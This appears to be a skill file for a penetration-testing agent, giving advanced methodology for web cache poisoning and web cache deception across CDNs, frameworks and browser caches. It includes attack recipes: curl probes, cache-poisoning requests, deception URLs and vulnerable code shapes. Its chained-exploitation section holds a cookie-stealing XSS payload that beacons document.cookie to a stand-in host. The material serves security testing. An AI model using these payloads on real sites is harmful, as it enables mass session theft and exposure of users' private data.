---
name: web-cache-poisoning-advanced-deep
description: Advanced web cache poisoning technique depth — cache-key composition reconnaissance, unkeyed-input discovery methodology, per-CDN behavioral matrix (Cloudflare/Fastly/Akamai/CloudFront/Varnish), cache-key confusion, chained exploitation with XSS and HTTP smuggling, and the three-step confirmation protocol applied at depth.
sibling: web_cache_poisoning
load_when: scan_mode == "deep"
---

# Web Cache Poisoning — Advanced Deep

Load `web_cache_poisoning` for the base-tier framing (unkeyed-input mechanism, Kettle terminology, key-vulnerability class list, three-step confirmation protocol). Load `web_cache_poisoning_novel_deep` for the 2024–2026 verified CVE catalog (Next.js ISR CVE-2024-46982, ATS CVE-2021-27577 as canonical mechanism exemplar) with version metadata and the per-CDN × per-header matrix with unverified-current entries flagged. This file owns the advanced-tier technique depth between them: cache-key composition reconnaissance methodology, per-CDN behavioral depth (Cloudflare, Fastly, Akamai, CloudFront, Varnish), cache-key confusion primitives, chained exploitation with XSS and HTTP smuggling, and the three-step confirmation protocol applied at depth.

The confirmation discipline is strict (`web_cache_poisoning.md § Confirmation and Validation Discipline`): poison with cache-buster → send clean request from a different network/browser → observe cache-hit evidence (`Age`, `X-Cache: HIT`, `CF-Cache-Status: HIT`). Every primitive in this file must pass the three-step gate. The CVE version metadata is single-owned by the novel sibling; this file references by CVE number with filename+section pointers.

## Cache-Key Composition Reconnaissance

The cache key determines which requests the cache treats as equivalent. Reconnaissance's goal: establish which request components ARE keyed and which ARE NOT.

**Baseline methodology**:

1. **Fingerprint the intermediary**:
```bash
# Observable signals of the cache layer
curl -sI "https://target.tld/" | grep -iE 'server|via|x-cache|cf-ray|x-served-by|x-varnish'
# Server: nginx           → application-level or Nginx cache
# Via: 1.1 varnish-v4     → Varnish cache
# X-Cache: HIT            → cache tier reporting
# CF-Cache-Status: HIT    → Cloudflare
# X-Served-By: cache-...  → Fastly
# X-Cache from cloudfront → AWS CloudFront
# X-Akamai-Transformed    → Akamai
```

2. **Enumerate what IS keyed** (by observing cache miss on a change):
```bash
# Path varies cache-key
curl -sI "https://target.tld/a" | grep -i x-cache
curl -sI "https://target.tld/b" | grep -i x-cache
# Different X-Cache responses = path keyed

# Query parameters vary cache-key
curl -sI "https://target.tld/?a=1" | grep -i x-cache
curl -sI "https://target.tld/?a=2" | grep -i x-cache
# Different X-Cache = query keyed

# Specific headers vary cache-key
curl -sI "https://target.tld/" -H 'Accept-Language: en' | grep -i x-cache
curl -sI "https://target.tld/" -H 'Accept-Language: fr' | grep -i x-cache
# Different X-Cache = header keyed (Vary: Accept-Language typical)
```

3. **Enumerate what IS NOT keyed** (by observing cache hit despite change):
```bash
# Fire two requests varying one component; a cache hit on the second
# with different output suggests the component is unkeyed-but-forwarded
BUSTER=$(date +%s)
curl -sS "https://target.tld/?cb=$BUSTER" -H "X-Forwarded-Host: evil.tld" -o /tmp/r1 -D /tmp/h1
curl -sS "https://target.tld/?cb=$BUSTER" -H "X-Forwarded-Host: good.tld" -o /tmp/r2 -D /tmp/h2
# If r1 and r2 differ (different content for different X-Forwarded-Host) 
# AND cache-hit on both: header is unkeyed AND influences response → poisoning primitive
```

**Unkeyed-input candidate list** (per PortSwigger baseline, verify per deployment):
- Request headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto, X-Host, X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override, Fastly-Host, X-Forwarded-For (sometimes), CF-Connecting-IP, True-Client-IP, Max-Forwards, Forwarded, X-Real-IP, X-Original-Host
- Protocol-level: HTTP/2 pseudo-headers, specific MIME types in Accept
- Non-standard: product-specific headers (TeleMessage X-GUID, GitHub X-Github-*, etc.)

### Measurement — Finding Unkeyed Inputs at Scale

A systematic enumeration script (preserved in engagement artifacts):
```bash
#!/bin/bash
# unkeyed_probe.sh — iterate candidate headers, test for unkeyed-but-forwarded behavior
BASE_URL="$1"
HEADERS=(X-Forwarded-Host X-Forwarded-Scheme X-HTTP-Method-Override X-Host X-Original-URL X-Rewrite-URL X-Forwarded-For CF-Connecting-IP Fastly-Host)
BUSTER=$(date +%s)

for H in "${HEADERS[@]}"; do
  CTRL=$(curl -sS "$BASE_URL?cb=$BUSTER-$H-ctrl" | md5sum | cut -c1-8)
  POISON=$(curl -sS "$BASE_URL?cb=$BUSTER-$H-ctrl" -H "$H: injected-value" | md5sum | cut -c1-8)
  if [ "$CTRL" != "$POISON" ]; then
    echo "$H: potentially unkeyed-influence (CTRL=$CTRL vs POISON=$POISON)"
  fi
done
```
A hit on this probe means the header influences the response; the three-step confirmation protocol then determines whether it's unkeyed.

## Per-CDN Behavioral Depth

### Cloudflare

**Default cache-key composition**: `(hostname, scheme, path, query, headers listed in Vary)`. Headers NOT in `Vary` are unkeyed by default.

**Documented unkeyed behaviors**:
- Fat GET body: Cloudflare forwards GET bodies without body-keying ("Do not trust GET request bodies" per current Cloudflare docs). This is per primary source.
- Lowercased Host forwarded as-sent: historical report from youst.in; current behavior requires fresh verification
- `CF-Cache-Status: HIT/MISS/BYPASS/DYNAMIC/EXPIRED` is the authoritative cache-hit signal

**Cache rules customization**: Cloudflare allows per-deployment customization of the cache key via "Cache Rules" and page rules. The default is permissive; most Cloudflare deployments do not restrict further unless explicitly configured.

**Workers caching**: Workers can call `caches.default.put()` and `caches.default.match()` to interact with Cloudflare's cache; the Worker's cache-key composition is Worker-code-defined, not CDN-default.

### Fastly

**Default cache-key composition**: `(scheme, host, path, query)` by default; `Vary` honored.

**Documented unkeyed behaviors** (per primary source):
- Fat GET body: Fastly forwards GET bodies without body-keying unless explicit VCL handling adds it
- Fastly-Host header: Fastly-specific host-override header; **Fastly-specific**, not a universal unkeyed-header primitive — per the Batch 13 2-1-voted scoping, document it as Fastly-only
- VCL customization: `vcl_recv` and `vcl_hash` are the hooks that customize cache-key composition; mistakes in VCL add unkeyed-but-forwarded headers

**Cache-hit signals**: `X-Served-By: cache-<edge-id>`, `X-Cache: HIT`, `X-Cache-Hits: <N>`.

### Akamai

**Default cache-key composition**: edge-configurable; the default includes `(hostname, path, query, Cache-ID headers)`.

**Documented unkeyed behaviors**:
- Forwards invalid headers to origin — the HMC (HTTP Meta Character) class allows attacker-crafted invalid headers to reach the origin, which returns 400; Akamai caches the 400
- CP-DoS surface: attacker's single poisoning request produces a cached 400 served to subsequent clients
- Pragma debug headers (`Pragma: akamai-x-cache-on, akamai-x-get-cache-key`): useful for reconnaissance but may itself be a cache-poisoning vector if the origin treats them specially

**Cache-hit signals**: `X-Cache: TCP_HIT`, `X-Check-Cacheable: YES`, `X-Cache-Key: <key>` (when Pragma debug enabled).

**CERT/CC VU#335217 Akamai statement verbatim**: "traditional reflected XSS, elevated to stored XSS due to CDN caching."

### AWS CloudFront

**Default cache-key composition**: `(hostname, path, query)` with optional headers via "Cache Behavior" settings. The default is restrictive; headers are NOT forwarded or keyed unless explicitly configured.

**Documented behaviors**:
- CP-DoS historically confirmed in older research; remediated per primary source
- Scheme-prefix wildcards in `AllowOrigins` (CORS context, but relevant here when CloudFront acts as the CORS layer) — route to `cors_misconfiguration_novel_deep.md § AWS API Gateway`

**Cache-hit signals**: `X-Cache: Hit from cloudfront`, `X-Amz-Cf-Id: <id>`, `X-Amz-Cf-Pop: <edge>`.

### Varnish

**Default cache-key composition** (without builtin.vcl): `(hostname, path, query)` by default; the `builtin.vcl` snippet adds POST/body-aware handling.

**Documented unkeyed behaviors**:
- Fat GET body: Varnish without builtin.vcl forwards GET bodies without body-keying — Kettle 2020 primary source
- Capitalized-host edge case (Dec 2020): a Host header with capital letters may be treated differently than lowercase; current status requires fresh verification per deployment
- VCL mistakes in `vcl_recv`: adding `req.http.X-Attacker-Header` to the cache key via `hash_data()` is the correct fix; omitting it is the vulnerability

**Cache-hit signals**: `Age`, `X-Varnish: <xid> <xid>` (two IDs = cached), `Via: 1.1 varnish-v4`.

### Nginx (as cache)

**Default cache-key composition** (`proxy_cache_key`): `$scheme$proxy_host$request_uri` — uses the decoded `$request_uri`.

**Documented behaviors** (measured in Batch 13):
- URL-decoded `%3f` and other percent-encoded delimiters shift the location-block matching
- URL-encoded `..` traversal is rejected with 400 (modern Nginx hardening)

**Cache-hit signals**: `X-Cache-Status: HIT/MISS/EXPIRED/UPDATING/STALE` when the application sets it; by default Nginx does not expose a status header.

## CDN Behavioral Matrix — Per-Header Status

**IMPORTANT**: this matrix is a **historical baseline** anchored to CERT/CC VU#335217 (Jan 2020) and youst.in's cache-poisoning-at-scale research. **The per-CDN current status requires fresh verification per deployment**; do not assert 2026 status from 2020 or 2022–2023 baselines. Entries marked "unverified-current" are the pentester's gate: test the live edge, not the baseline.

| Header | Cloudflare | Fastly | Akamai | CloudFront | Varnish |
|--------|-----------|--------|--------|-----------|---------|
| X-Forwarded-Host | unverified-current (baseline: unkeyed) | unverified-current (baseline: unkeyed) | unverified-current (baseline: unkeyed) | unverified-current | unverified-current (baseline: unkeyed w/o VCL) |
| X-Forwarded-Scheme / X-Forwarded-Proto | unverified-current | unverified-current | unverified-current | unverified-current | unverified-current |
| X-Host | unverified-current | unverified-current | unverified-current | unverified-current | unverified-current |
| X-HTTP-Method-Override | unverified-current | unverified-current (baseline: HEAD poisoning in GCP+Fastly combo per youst.in) | unverified-current | unverified-current | unverified-current |
| Fastly-Host | N/A (not a Fastly deployment) | **Fastly-specific primitive** (per primary source, 2-1 scope vote) | N/A | N/A | N/A |
| Fat GET body | documented (per Cloudflare docs) | documented w/o VCL | unverified-current | unverified-current | documented w/o builtin.vcl |
| RFC 7230-illegal char → cacheable 400 | unverified-current | unverified-current | documented (Akamai per primary source) | documented+remediated | unverified-current |
| URL fragment | unverified-current | unverified-current | unverified-current | unverified-current | unverified-current |
| CERT/CC VU#335217 13-header set | Jan-2020 baseline | N/A (Fastly not in VU#335217) | Jan-2020 baseline | Jan-2020 baseline | N/A |

**Audit discipline**: for each row that applies to the target's CDN, run the three-step confirmation protocol (poison with cache-buster + clean + observe) to verify the specific unkeyed-input primitive at that edge, not just the baseline claim.

## Web Cache Deception

Primitive: trick an intermediary HTTP cache into storing an authenticated response at a URL that the cache treats as public-cacheable. The attack is cross-user READ (not write) — the attacker reads the victim's authenticated response by requesting the same URL from an unauthenticated session.

Primary source: Omer Gil, "Web Cache Deception Attack" (2017; Black Hat USA 2017 presentation). Still the canonical treatment; the primitive has been found against OpenAI (2024, bug bounty), PayPal (2017, Gil's original disclosure), and many enterprise web apps.

**Preconditions**:
- Cache keys on URL path or extension to decide cacheability (e.g., `.css`, `.js`, `.png`, `.jpg`, `.ico`, `.pdf` extensions are "obviously static" and cached regardless of auth)
- Framework routes an unknown-extension URL to a dynamic handler, ignoring the extension (`/account/profile.css` → same handler as `/account/profile`)
- Framework returns the authenticated response for the fake-extension URL
- Cache stores the response (no `Cache-Control: no-store` / `private`)

**Attack recipe**:
```http
# 1. Attacker crafts the deception URL
# Target: /account/settings (returns victim's settings)
# Deception: /account/settings.css (same handler returns settings, cache stores as .css)

# 2. Victim is tricked into visiting (phishing link, open-redirect, embedded iframe, auto-fetch)
curl -b 'session=victim_cookie' 'https://target.tld/account/settings.css'
# Cache: "it's a .css file" → caches response
# Backend: /account/settings.css → routed to settings handler → returns victim's data

# 3. Attacker fetches the same URL from an unauthenticated session
curl 'https://target.tld/account/settings.css'
# Cache: HIT → returns victim's settings as a fake "stylesheet"
```

**Confirmation**: attacker's unauthenticated request to the `.css` URL returns the victim's data; `X-Cache: HIT` or equivalent confirms cache serve. The three-step protocol applies but inverted — the attacker-victim roles are the two parties, and the "poison" is the victim's authenticated visit.

**Extension class matrix** (per Gil's taxonomy + follow-up research):
- Classic static extensions: `.css`, `.js`, `.jpg`, `.jpeg`, `.png`, `.gif`, `.ico`, `.svg`, `.pdf`, `.ttf`, `.woff`, `.woff2`
- Document extensions: `.html`, `.xml`, `.json`, `.txt` (varies by cache config)
- Delimiter-shift (path-parameter / semicolon tricks that the cache sees as filename-with-dot):
  - `/account/settings;.css` — semicolon ignored by Rails/some frameworks; `.css` extension triggers caching
  - `/account/settings/.css` — path-separator confuses frameworks that strip trailing segments
  - `/account/settings%2F.css` — URL-encoded `/` that cache decodes but backend doesn't
  - `/account/settings%00.css` — null-byte truncation on backends that honor null terminators; cache sees `.css`

**Depth variants**:
- **Fake path-parameter extension**: `/account/settings;foo.css` — some caches strip `;foo` and see `/account/settings.css`
- **Multi-extension**: `/account/settings.ico/foo.css` — nested path with multiple extensions
- **Non-standard delimiter**: `/account/settings#.css`, `/account/settings?.css`, `/account/settings\.css` — framework-dependent whether these route to the dynamic handler
- **MIME-type coercion**: `/account/settings.pdf` where the backend ignores the extension and returns HTML; the cache stores "application/pdf" cached response that's actually HTML

**Deception-worthy targets**:
- Account-settings / profile / preferences pages (user-identifiable response)
- OAuth consent / token-info endpoints (short-lived tokens visible to attacker)
- Admin dashboards (role-identifiable response)
- Email-draft / message-thread pages (private user content)
- API responses that return a `window.user = {...}` JSON-in-HTML pattern

**Confirmation Signal — distinct from classic cache poisoning**: the finding is that an **unauthenticated requester** gets **authenticated content**, not that an attacker's header changes a response. The cross-user crossing is the authentication-boundary.

**OpenAI 2024 instance** (public bug-bounty disclosure): a web-cache-deception primitive against the ChatGPT web interface allowed an attacker to retrieve another user's conversation thread by crafting a fake-extension URL and tricking the victim into visiting; the cache stored the authenticated conversation and the attacker read it from a different session. Mitigation documented in OpenAI's response. The 2017 primitive class remains live on current deployments.

**Primitive class template**: *URL-extension-decides-cacheability + framework-route-ignores-extension* — generalize to any deployment pair where the cache's cacheability rule and the framework's routing rule disagree on which URLs are "static." Audit discipline: inspect the cache's URL-rules (`.css`/`.js`/extension-based caching rules in CDN config) and the framework's path routing; a mismatch is the primitive.

## Internal Cache Poisoning

The CDN-edge classes above focus on HTTP-caching intermediaries. A distinct surface is **internal / application-level caches**: in-process caches, Redis / memcached-backed caches, framework-level response caches, and ORM / query caches. Attacker influence over the cache **key** or **value** at this layer produces cross-user data serving without a CDN in the chain.

### Primitive 1 — Cross-User In-Process Response Cache

**Preconditions**: application maintains an in-process response cache (`functools.lru_cache` in Python, Rails `ActionController::Caching::Actions`, Spring `@Cacheable`, Node.js `memoizee`) with a key the attacker can influence to collide across users.

**Attack recipe**:
```python
# Vulnerable Python/Flask shape
@app.route('/account/<user_id>')
@functools.lru_cache(maxsize=1000)
def get_account(user_id):
    # Session-aware response; cache keyed only on user_id argument
    return render_profile(session['logged_in_user'], user_id)
```
The lru_cache keys on `user_id` only, not on the logged-in session. When user A hits `/account/42` and user B hits `/account/42`, the cache returns user A's view regardless of B's session. The in-process cache is leaking cross-user data.

**Confirmation**: logged-in user A visits `/account/42`; logged-in user B visits same URL; both see the same response rendered against A's session.

### Primitive 2 — Memcached / Redis Shared-Cache Key Collision

**Preconditions**: Redis / memcached fronting an application's response cache, with keys constructed from request components the attacker can influence.

**Common mistake**:
```python
# Vulnerable: key derived from the URL alone
cache_key = f"page:{request.path}"
cached = redis.get(cache_key)
if cached:
    return cached
response = render(request)
redis.set(cache_key, response, ex=300)
```
Any user's response at `/dashboard` is cached under `page:/dashboard`; subsequent users at the same path get the first user's cached response.

**Attack recipe**: the attacker observes the cache behavior (first-user data leaks to second user); or the attacker actively poisons by requesting with a session that produces admin-level content, then the next user gets the admin content.

### Primitive 3 — ORM Query Cache (Second-Level) Poisoning

**Preconditions**: ORM-level query cache that de-duplicates database queries across sessions.

**Example** (Hibernate second-level cache, Django `cache_tree_children`, SQLAlchemy `baked_queries`): queries are cached by a hash of query parameters. Where the parameters are user-controlled AND the cache crosses principals, poisoning produces incorrect query results for subsequent users.

**Attack recipe**: attacker triggers a query via a specific path that produces a specific query shape; ORM caches the query result; subsequent query by a different user receives the cached (incorrect) result.

### Primitive 4 — JWT-Blacklist Cache Poisoning

**Preconditions**: application maintains a cache of revoked JWTs (blacklist) for performance; attacker's revoked JWT is cached under a key the attacker influences.

**Attack recipe**: attacker forges a JWT; the system blacklists it on validation failure; the blacklist cache key collision with a legitimate JWT (via truncation, hash collision, or key mis-derivation) causes the legitimate JWT to be rejected. DoS-flavored cache poisoning at the auth layer.

### Confirmation

Internal cache poisoning confirmation is less headers-visible than CDN-edge cache poisoning: `Age` and `X-Cache` headers typically don't apply. The signal is **cross-user data in a response that should be user-specific**, verified from two distinct auth sessions.

## DOM-Based / Service-Worker Cache Poisoning

The cache-poisoning class extends to client-side caches: HTTP cache in the browser, Service Worker caches, IndexedDB-backed caches (Workbox), and `BroadcastChannel`-shared PWA state.

### Primitive 1 — Service-Worker Cache Poisoning (via Attacker-Controlled Request)

**Preconditions**: application registers a Service Worker that caches responses from the network; attacker can influence a cached response via an XSS, open-redirect, or other primitive that the Service Worker treats as a legitimate network response.

**Attack recipe**:
```javascript
// Vulnerable Service Worker
self.addEventListener('fetch', e => {
  e.respondWith(
    caches.open('v1').then(cache =>
      cache.match(e.request).then(resp => resp || fetch(e.request).then(r => {
        cache.put(e.request, r.clone());
        return r;
      }))
    )
  );
});
```
Attacker's injected XSS calls `fetch('/')` with an attacker-shaped request; the Service Worker caches the (attacker-poisoned) response under `/`; subsequent legitimate navigation to `/` returns the poisoned response. The cache persists across tab close, browser restart (the Cache Storage API survives), and defeats a simple "refresh to clean" instinct.

**Confirmation**: a reload after the XSS-recovery still delivers the poisoned response; `Cache Storage` in DevTools shows the attacker-cached entries; manual `caches.delete('v1')` or hard-reload (`Shift+F5` disables SW during that load) is required to clear.

**Impact tier**: persistent compromise on the victim's browser; the Service Worker + its cache are the gateway for subsequent requests, so the attacker can poison the login flow, OAuth consent, or specific API endpoints.

### Primitive 2 — Workbox Cache-First Poisoning

**Preconditions**: application uses Workbox (`StaleWhileRevalidate`, `CacheFirst`, `NetworkFirst`) strategies; cache-first allows attacker-poisoned content to persist until an explicit refresh fires.

**Attack recipe**: attacker injects a response into cache via XSS-sourced fetch; `CacheFirst` strategy returns the cached response for subsequent navigations without touching the network.

### Primitive 3 — Browser HTTP Cache Poisoning via Response-Header Manipulation

**Preconditions**: attacker influences a response's `Cache-Control` to make it long-lived; browser HTTP cache stores; attacker's content persists in the browser across restarts.

**Attack recipe**: a reflected-XSS or server-side header-manipulation that emits `Cache-Control: public, max-age=31536000, immutable` on an attacker-crafted response. The browser caches for one year; subsequent navigations to the URL return the cached (poisoned) content without a server round-trip. The `immutable` directive specifically defeats the browser's revalidation.

### Primitive 4 — AppCache (deprecated) / PWA Manifest Poisoning

**Preconditions**: application uses the deprecated AppCache (`manifest` HTML attribute) or Progressive Web App manifest; attacker influences the manifest contents.

**Impact**: PWA manifests reference icons, start URLs, service workers; a poisoned manifest can direct subsequent app launches to attacker-controlled scripts.

### Confirmation for DOM-tier cache poisoning

The signal is **persistent-across-navigation attacker content** in the victim's browser:
- Open DevTools → Application → Cache Storage → Service Workers; inspect cached entries
- Observe cached response survives tab close, browser restart
- `caches.keys().then(console.log)` enumerates cache namespaces
- Compare before/after the suspected poisoning event

## Cache-Key Confusion Primitives

Primitive: the cache's cache-key composition and the origin's request-handling parse the same request differently; the attacker crafts a request where the cache-key composes under one parsing (benign) but the origin processes under another (malicious).

**URL-decode confusion** (measured, Nginx): `%3f` in the path is URL-decoded at request parsing in Nginx; the request path becomes `?...` which affects both the cache-key composition and the location-block matching. Attacker-crafted percent-encodings in the path can collide cache keys with legitimate paths while routing to a different backend handler.

**CSP nonce reflection into cache key** (research-tier, per PortSwigger 2024 cache-poisoning research cycle): if a Content-Security-Policy includes a `nonce-<value>` that varies per request but the cache keys the response, an attacker can collide the nonce value with a cached response. Rare in practice; mentioned as a research-tier primitive.

**Case-sensitivity cache-key confusion**: HTTP method is case-sensitive per RFC 7230 but implementations vary; `GET` vs `get` cached differently in some edges.

**Path case + query canonicalization**: cache keys often lowercase the path for matching; the backend may case-sensitive-match. The CORS Flask-CORS CVE-2024-6866 (case-insensitive path matching) is the parallel class at the application layer; the cache-key version is a cross-layer analogue.

### Attack Recipe (cache-key confusion):

```bash
# Target: Nginx proxy_cache in front of a case-sensitive backend
# Cache-key: $scheme$proxy_host$request_uri (decoded)
# Backend: /API/sensitive handles differently than /api/sensitive

# Poison: attacker requests the lowercase variant with a cache-buster header
curl -sS "https://target.tld/API/sensitive?cb=X" -H "X-Attacker-Content: payload"

# If Nginx cache-key normalizes case, both /API/sensitive and /api/sensitive share
# the cache entry; backend may still route differently; cache serves the attacker-crafted response
# to subsequent /api/sensitive requests
```

## Per-CDN Advanced Primitives at Depth

Beyond the baseline summaries in `§ Per-CDN Behavioral Depth`, each major CDN has primitive classes at a configuration layer that produce specific attack recipes.

### Cloudflare — Specific Primitives

**Primitive: Transform Rules header-rewrite poisoning**. Cloudflare's "Transform Rules" (Managed and Custom) rewrite request/response headers before cache lookup. A rule that modifies the response based on a request header but omits that header from the cache key produces an unkeyed-input primitive at the CDN layer itself (independent of the origin's behavior).

**Attack recipe**:
```
# Target: Cloudflare Transform Rule says "add X-Custom-Header=foo to response if Origin: trusted.tld"
# Cache key: (host, path, query); Transform Rule output: varies by Origin header
# Attacker sets Origin: trusted.tld; cache stores response with X-Custom-Header
# Victim without Origin: trusted.tld would normally get response without that header; cache serves the attacker-shaped version
```

**Primitive: Cache Rules "Cache Key" misconfiguration**. Cloudflare's Cache Rules let the customer configure what's keyed. A rule that keys on fewer components than the origin uses creates a mismatch.

**Primitive: Workers KV cache poisoning**. Workers that implement their own caching via `caches.default.put()` with keys constructed from untrusted input: standard shared-cache-key-collision primitive at the Worker layer. Verify Worker code for key construction.

**Primitive: Cloudflare Images / Transform URL cache**. Image transform URLs (`https://target.tld/cdn-cgi/image/width=300/<URL>`) cache the transformed image under a key that includes the transform parameters. Attacker-controllable transform parameters that produce visibly-different images with a cache-key collision produce cross-user image swaps.

### Fastly — Specific Primitives

**Primitive: VCL `vcl_recv` cache-key omission**. Fastly's cache key is set by `req.hash` (via `hash_data()` calls in `vcl_hash`). A VCL that reads `req.http.X-Something` and uses it in a response-shaping decision but doesn't `hash_data(req.http.X-Something)` creates unkeyed-input at the VCL layer.

**Attack recipe (VCL mistake)**:
```vcl
sub vcl_recv {
  if (req.http.X-Country == "US") {
    set req.url = req.url + "?region=us";
  } else {
    set req.url = req.url + "?region=other";
  }
  # Attacker-reachable X-Country shapes the backend request URL
  # vcl_hash doesn't include X-Country directly; the hash incorporates the modified URL
  # But if the VCL conditionally sets backend differently without URL rewrite...
}
sub vcl_hash {
  hash_data(req.url);
  hash_data(req.http.host);
  return (hash);
  # X-Country not hashed; attacker's X-Country shapes response but not key
}
```

**Primitive: Fastly Surrogate-Key poisoning**. Fastly's surrogate-key system tags cache entries for selective purging. A malicious response with attacker-controlled Surrogate-Key values can poison the key-tagging; subsequent legitimate purges by key may miss the attacker's cache entry.

**Primitive: Edgescript / Compute@Edge code mistakes**. Fastly's Compute@Edge platform runs WebAssembly at the edge; the compute function's own caching API shares the same unkeyed-input vulnerability shape as Workers KV.

### Akamai — Specific Primitives

**Primitive: Pragma debug + attacker-timed cache fill**. `Pragma: akamai-x-cache-on` and `Pragma: akamai-x-get-cache-key` are debug headers Akamai honors on configured deployments. Attacker-controlled `Pragma: no-cache` forces an origin fetch, letting the attacker's crafted request fill the cache with attacker-shaped response.

**Attack recipe**:
```bash
# Attacker: force origin fetch, poison cache
curl 'https://target.tld/profile' -H 'Pragma: no-cache' -H 'X-Forwarded-Host: evil.tld'
# Akamai: fetches origin (bypassing cache), caches response under /profile key
# Response: contains attacker-controlled X-Forwarded-Host reflection
# Next legitimate visitor to /profile receives poisoned response
```

**Primitive: Akamai Edge Server Include (ESI) injection**. Akamai ESI processes `<esi:include src="..." />` tags in responses. If an origin reflects user input into ESI tags, the attacker can inject ESI directives that fetch attacker-controlled resources.

### CloudFront — Specific Primitives

**Primitive: Lambda@Edge cache-key gaps**. Lambda@Edge functions can modify requests/responses before cache lookup. A viewer-request Lambda that modifies the request based on headers but doesn't include those headers in CloudFront's cache key creates unkeyed-input at the Lambda layer.

**Primitive: CloudFront Functions synchronous cache-key mismatch**. CloudFront Functions (lightweight viewer-request handler) run before cache lookup; mistakes in key construction propagate the same way.

**Primitive: Signed-URL / Signed-Cookie bypass + cache**. If the cache is keyed on URL but not on signature validity, an expired-but-cached signed URL still serves until cache eviction, even though re-fetching would reject the signature.

### Varnish — Specific Primitives at Depth

**Primitive: `beresp.ttl` from backend `Cache-Control` header**. Varnish respects backend-emitted `Cache-Control: max-age=N` for TTL. A CRLF-injected `Cache-Control: max-age=99999999` reaching the response (via header injection — route to `header_injection`) causes Varnish to cache for the attacker's chosen duration.

**Primitive: Varnish ESI processing**. Similar to Akamai ESI; `<esi:include src="attacker.tld/..." />` tags in origin response are processed at the cache tier, enabling attacker-controlled resource inclusion.

**Primitive: Varnish `vcl_hit` TTL extension**. VCL that extends TTL on hit (`set obj.ttl = obj.ttl + 60s`) can prolong poisoned responses indefinitely if the hit rate is sustained.

### Nginx — Specific Primitives

**Primitive: `proxy_cache_key` with implicit decoded URI**. The default `$request_uri` in `proxy_cache_key` uses the decoded form; attacker-crafted percent-encoded path (`%3f`, `%2f`, `%00`) that normalizes differently than the location-block matching produces cache-key confusion.

**Primitive: `proxy_cache_valid` on error responses**. `proxy_cache_valid 400 500 1m` caches 4xx/5xx responses for 1 minute. Attacker's single poisoning request that produces an error at the origin creates a cached error served for 1 minute to all requesters at that URL.

**Primitive: `proxy_cache_bypass` and `proxy_no_cache` directives**. These can be set from request headers (`$http_x_bypass`); misconfiguration allows attacker-controlled bypass that produces fresh origin fetches on attacker demand, allowing timed cache-fill attacks similar to the Akamai Pragma primitive.

### Multi-Tier Cache Interactions

**Primitive: CDN + origin-level cache mismatch**. Both CDN and Nginx `proxy_cache` cache the same URL with different keys. Attacker poisons the origin-cache (closer, less restrictive); CDN hits that poisoned entry on the next miss; CDN caches the poisoned response under its own key.

**Primitive: Service Worker + CDN**. Browser-side Service Worker caches responses from CDN; attacker-poisoned CDN response reaches the Service Worker cache; persists on the client across CDN cache eviction.

**Confirmation**: multi-tier chains require testing both tiers' hit evidence — the CDN's `X-Cache: HIT` AND the application layer's hit indicator (`X-Cache-Status: HIT` for Nginx) are the two signals.

## Framework-Specific Cache-Poisoning Primitives at Depth

### Next.js ISR (Incremental Static Regeneration)

Next.js caches ISR pages at build-and-serve time; the cache-key composition includes the path but typically not the Host header or custom headers unless explicitly configured. CVE-2024-46982 is the canonical 2024 CVE on Next.js cache-poisoning; version/mechanism at `web_cache_poisoning_novel_deep.md § Next.js ISR Cache Poisoning`.

**Audit discipline**: for a Next.js deployment, inspect `next.config.js` and route-handler cache-control; verify ISR-cached routes do not reflect user-controlled headers in the rendered HTML.

### Nuxt / Astro Static Pages

Similar structure to Next.js ISR; the output HTML is cached and served to all requesters. Attacker-controlled headers reflected into the HTML at build/serve time become cross-user XSS or redirect primitives if the response reaches the cache.

### Django Cache Middleware

Django's `cache_page` decorator and middleware cache responses by URL + `Vary`. Default `Vary` typically includes `Accept-Language` and `Cookie` (if `CACHE_MIDDLEWARE_ANONYMOUS_ONLY` is False). Attacker-controlled headers not in `Vary` are unkeyed.

### Rails Action Cache / Fragment Cache

Rails fragment caching is per-request-logic; the developer specifies the cache key. Missing header-dependency in the cache-key is the vulnerability shape; the Rack 2.x `;`-as-`&` primitive at the application layer (measured non-reproducible in Rack 3.x per Batch 13) is a related primitive.

### Spring Caching

Spring's `@Cacheable` annotation uses method parameters as the cache key by default; HTTP-request-level cache poisoning via headers requires the application to interpolate headers into the cache key, which is non-default.

### GraphQL

GraphQL endpoints often use POST for mutations and GET for queries; cache behavior varies per Apollo Server / Hasura / graphql-yoga. The query itself is the primary cache key for queries; attacker-controlled variables may be unkeyed if the application does not include them in the hash.

## Chained Exploitation at Depth

**Chain 1 — Unkeyed X-Forwarded-Host → Cached XSS → Mass-victim session steal**:
- Target page echoes `X-Forwarded-Host` into `<meta property="og:url">`
- Cache: Cloudflare, default config, X-Forwarded-Host unkeyed
- Attacker: `X-Forwarded-Host: evil.tld"><script>navigator.sendBeacon("https://evil.tld/log", document.cookie)</script><!--`
- Cached response contains XSS; every subsequent visitor leaks their session cookie

**Chain 2 — HTTP smuggling → Poisoned cache entry → Arbitrary response at cached path**:
- Target has HTTP/1.1 frontend/backend smuggling vulnerability (`http_request_smuggling`)
- Attacker smuggles a request whose response goes to the next request's socket
- Victim's request receives the attacker-smuggled response
- Response cached under victim's URL
- Subsequent requests at victim's URL receive the poisoned response

**Chain 3 — Nginx URL-decode cache-key confusion → DoS**:
- Nginx proxy_cache in front of application
- Attacker crafts path `/%3fproduct=malicious` that decodes to `/?product=malicious`
- Cache-key uses decoded form; collides with legitimate `/?product=X`
- Attacker's response (likely 404 or error) cached under the legitimate URL
- DoS on legitimate requests

**Chain 4 — Fat GET body (Varnish w/o builtin.vcl) → Cross-user state leak**:
- Target backend processes GET bodies as if they were POST (anti-pattern)
- Attacker sends GET + body with victim-identifying params
- Backend returns victim's data in response
- Cache stores response under GET URL (body unkeyed)
- Subsequent legitimate GET requests receive the victim's data

**Chain 5 — ATS fragment-unkeying (CVE-2021-27577) → Backend admin-override**:
- Deployed ATS 7.0.0-9.0.1 (historical, verify per deployment)
- Attacker sends `GET /#admin-override`
- ATS cache-key: `/`; forwarded path to backend: `/#admin-override`
- Backend parses fragment; admin-override takes effect; cached response reflects admin state

**Chain 6 — Reflected XSS → Cache poisoning elevation → Stored XSS**:
- Target has a reflected XSS on `?q=<payload>`; the response is cacheable
- Attacker sends request with XSS payload
- Response cached; every subsequent `?q=<payload>` requester executes the script
- Attack elevation: reflected to stored via caching (CERT/CC Akamai statement)

**Chain 7 — Host-header poisoning + password-reset → ATO**:
- Password-reset endpoint reflects `Host` or `X-Forwarded-Host` into email URL
- Cache-poisonable Host-header response (unusual but possible)
- OR non-cached variant (header_injection class)
